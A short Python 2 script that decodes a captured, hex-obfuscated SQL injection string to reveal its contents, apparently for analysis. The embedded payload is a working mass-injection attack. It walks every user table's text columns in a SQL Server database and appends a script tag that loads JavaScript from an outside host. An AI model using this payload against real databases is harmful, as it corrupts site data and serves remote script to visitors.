from vyperlogix import oodb
from vyperlogix.url import decode

foo = "';DeCLARE%20@S%20CHAR(4000);SET%20@S=CAST(0x4445434C415245204054207661726368617228323535292C40432076617263686172283430303029204445434C415245205461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F626A6563747320612C737973636F6C756D6E73206220776865726520612E69643D622E696420616E6420612E78747970653D27752720616E642028622E78747970653D3939206F7220622E78747970653D3335206F7220622E78747970653D323331206F7220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20657865632827757064617465205B272B40542B275D20736574205B272B40432B275D3D5B272B40432B275D2B2727223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777332E3830306D672E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D272720776865726520272B40432B27206E6F74206C696B6520272725223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777332E3830306D672E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D272727294645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20AS%20CHAR(4000));ExEC(@S);"

foox = decode.urldecode(foo)

toks = foox.split('0x')

s_h = ''
for ch in toks[-1]:
    if (ch in oodb.hex_digits):
        s_h += ch
    else:
        break
    
h_list = []
for i in xrange(0,len(s_h),2):
    h_list.append(s_h[i:i+2])

ch_list = []
for h in h_list:
    ch_list.append(oodb.hexToStr(h))
    
print ''.join(ch_list)
pass